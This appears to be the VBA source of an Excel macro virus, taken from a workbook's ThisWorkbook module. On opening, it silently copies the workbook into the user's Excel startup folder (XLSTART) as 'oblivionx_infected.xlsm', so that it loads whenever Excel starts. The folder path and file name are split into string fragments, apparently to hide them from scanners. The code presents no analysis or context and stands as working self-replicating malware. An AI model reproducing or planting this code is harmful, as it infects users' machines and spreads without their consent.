Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim dst As String
    dst = Environ("APPDATA") & "\Micro" & "soft" & "\Exc" & "el\XLSTAR" & "T\oblivi" & "onx_infe" & "cted.xlsm"
    ThisWorkbook.SaveCopyAs dst
End Sub
